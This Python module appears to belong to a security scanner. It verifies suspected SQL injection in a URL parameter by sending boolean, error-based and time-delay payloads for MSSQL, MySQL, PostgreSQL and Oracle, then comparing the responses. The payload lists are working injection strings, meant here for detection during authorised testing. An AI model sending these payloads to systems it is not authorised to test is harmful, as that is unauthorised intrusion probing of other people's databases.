"""
Proof-based SQL injection verification.
Confirms SQLi findings using safe techniques before reporting.
"""
from __future__ import annotations
import re
import time
from dataclasses import dataclass, field
from typing import Optional, Literal
import httpx


ProofType = Literal["boolean_differential", "error_based", "time_differential", "unconfirmed"]


@dataclass
class ProofResult:
    confirmed: bool
    proof_type: ProofType
    confidence: int
    evidence: str
    request_count: int
    db_type: Optional[str] = None


BOOLEAN_PAYLOADS = {
    "true":  ["' AND '1'='1", "' AND 1=1--", "1 AND 1=1--", '" AND "1"="1'],
    "false": ["' AND '1'='2", "' AND 1=2--", "1 AND 1=2--", '" AND "1"="2'],
}

ERROR_BASED_PAYLOADS = {
    "mssql": [
        "' AND 1=CONVERT(int,'pentra_sqli_proof_marker')--",
        "' EXEC xp_noop()--",
    ],
    "mysql": [
        "' AND extractvalue(1,concat(0x7e,'pentra_sqli_proof_marker'))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT('pentra_sqli_proof_marker',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
    "postgresql": [
        "' AND 1=CAST('pentra_sqli_proof_marker' AS INTEGER)--",
        "'; SELECT pg_sleep(0); SELECT 'pentra_sqli_proof_marker'--",
    ],
    "oracle": [
        "' AND 1=CAST('pentra_sqli_proof_marker' AS NUMBER)--",
    ],
    "generic": [
        "' AND 1=CONVERT(int,'pentra_sqli_proof_marker')--",
        "' AND extractvalue(1,'pentra_sqli_proof_marker')--",
    ],
}

TIME_PAYLOADS = {
    "delay_5s": {
        "mssql":      "'; WAITFOR DELAY '0:0:5'--",
        "mysql":      "' AND SLEEP(5)--",
        "postgresql": "'; SELECT pg_sleep(5)--",
        "generic":    "'; WAITFOR DELAY '0:0:5'--",
    },
    "delay_0s": {
        "mssql":      "'; WAITFOR DELAY '0:0:0'--",
        "mysql":      "' AND SLEEP(0)--",
        "postgresql": "'; SELECT pg_sleep(0)--",
        "generic":    "'; WAITFOR DELAY '0:0:0'--",
    },
}

PROOF_MARKER = "pentra_sqli_proof_marker"


class SQLiProver:
    """
    Verify SQL injection using three safe techniques.
    Attempts techniques in order of reliability and request efficiency.
    """

    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self._request_count = 0

    async def prove(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        db_type: Optional[str] = None,
        original_value: str = "1",
    ) -> ProofResult:
        """
        Try all proof techniques. Returns first confirmed result.
        Falls back to unconfirmed if all fail.
        """
        self._request_count = 0
        db = (db_type or "generic").lower()

        result = await self._boolean_differential(client, url, param, original_value)
        if result.confirmed:
            result.db_type = db
            return result

        result = await self._error_based(client, url, param, db)
        if result.confirmed:
            result.db_type = db
            return result

        result = await self._time_differential(client, url, param, db)
        result.db_type = db
        return result

    async def _boolean_differential(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        original_value: str,
    ) -> ProofResult:
        """
        Send true/false conditions, check if responses differ from baseline.
        True condition should match baseline; false should differ.
        """
        try:
            base_resp = await client.get(url, params={param: original_value},
                                         timeout=self.timeout)
            self._request_count += 1
            base_len = len(base_resp.content)

            for true_p, false_p in zip(BOOLEAN_PAYLOADS["true"], BOOLEAN_PAYLOADS["false"]):
                true_resp = await client.get(url, params={param: original_value + true_p},
                                              timeout=self.timeout)
                self._request_count += 1
                true_len = len(true_resp.content)

                false_resp = await client.get(url, params={param: original_value + false_p},
                                               timeout=self.timeout)
                self._request_count += 1
                false_len = len(false_resp.content)

                true_similar = abs(true_len - base_len) < 50
                false_differs = abs(false_len - base_len) > 50

                if true_similar and false_differs:
                    return ProofResult(
                        confirmed=True,
                        proof_type="boolean_differential",
                        confidence=90,
                        evidence=(
                            f"Boolean differential confirmed: true condition length={true_len} "
                            f"(similar to baseline={base_len}), false condition length={false_len} "
                            f"(differs by {abs(false_len - base_len)} bytes)"
                        ),
                        request_count=self._request_count,
                    )

        except Exception:
            pass

        return ProofResult(
            confirmed=False, proof_type="unconfirmed", confidence=0,
            evidence="Boolean differential: no significant difference detected",
            request_count=self._request_count,
        )

    async def _error_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        db_type: str,
    ) -> ProofResult:
        """
        Inject error-based payload and check if proof marker appears in error.
        """
        payloads = ERROR_BASED_PAYLOADS.get(db_type, ERROR_BASED_PAYLOADS["generic"])

        for payload in payloads:
            try:
                resp = await client.get(url, params={param: payload}, timeout=self.timeout)
                self._request_count += 1
                text = resp.text.lower()

                if PROOF_MARKER in text or "conversion failed" in text or \
                   "xpath" in text or "extractvalue" in text:
                    return ProofResult(
                        confirmed=True,
                        proof_type="error_based",
                        confidence=95,
                        evidence=f"Error-based proof: response contains SQLi error indicator. "
                                 f"Payload: {payload[:60]}",
                        request_count=self._request_count,
                    )
            except Exception:
                pass

        return ProofResult(
            confirmed=False, proof_type="unconfirmed", confidence=0,
            evidence="Error-based: no SQLi error reflected",
            request_count=self._request_count,
        )

    async def _time_differential(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        db_type: str,
    ) -> ProofResult:
        """
        Send 5s delay and 0s delay payloads; compare response times.
        More reliable than single timing check.
        """
        delay_5 = TIME_PAYLOADS["delay_5s"].get(db_type, TIME_PAYLOADS["delay_5s"]["generic"])
        delay_0 = TIME_PAYLOADS["delay_0s"].get(db_type, TIME_PAYLOADS["delay_0s"]["generic"])

        try:
            t0 = time.monotonic()
            await client.get(url, params={param: delay_5}, timeout=self.timeout + 6)
            elapsed_5 = (time.monotonic() - t0) * 1000
            self._request_count += 1

            t0 = time.monotonic()
            await client.get(url, params={param: delay_0}, timeout=self.timeout)
            elapsed_0 = (time.monotonic() - t0) * 1000
            self._request_count += 1

            time_diff = elapsed_5 - elapsed_0

            if 3500 <= time_diff <= 6500:
                return ProofResult(
                    confirmed=True,
                    proof_type="time_differential",
                    confidence=85,
                    evidence=(
                        f"Time differential confirmed: 5s-delay payload took {elapsed_5:.0f}ms, "
                        f"0s-delay took {elapsed_0:.0f}ms "
                        f"(diff={time_diff:.0f}ms, expected ~5000ms)"
                    ),
                    request_count=self._request_count,
                )
            else:
                return ProofResult(
                    confirmed=False,
                    proof_type="time_differential",
                    confidence=20,
                    evidence=(
                        f"Time differential inconclusive: diff={time_diff:.0f}ms "
                        f"(expected 3500–6500ms for 5s delay)"
                    ),
                    request_count=self._request_count,
                )

        except httpx.TimeoutException:
            return ProofResult(
                confirmed=True,
                proof_type="time_differential",
                confidence=70,
                evidence="5s delay payload caused request timeout — possible time-based SQLi",
                request_count=self._request_count,
            )
        except Exception as e:
            return ProofResult(
                confirmed=False, proof_type="unconfirmed", confidence=0,
                evidence=f"Time differential: error during test: {e}",
                request_count=self._request_count,
            )
